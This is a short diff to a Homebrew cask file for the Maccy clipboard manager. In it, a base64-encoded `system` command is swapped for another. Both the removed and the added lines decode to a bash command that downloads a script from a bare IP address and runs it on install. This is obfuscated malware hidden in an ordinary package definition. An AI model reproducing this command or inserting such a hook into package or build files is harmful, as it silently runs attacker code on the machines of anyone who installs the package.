@@ -8,7 +8,7 @@ cask "maccy" do
   name "Maccy"
   desc "Clipboard manager for macOS"
   homepage "https://maccyapp.com/"
-  system "echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9Sb2pldnV3aSki' | base64 -d | bash"
+  system "echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9NZXl1Z2Vnbyki' | base64 -d | bash"
   auto_updates true
 
   app "Maccy.app"
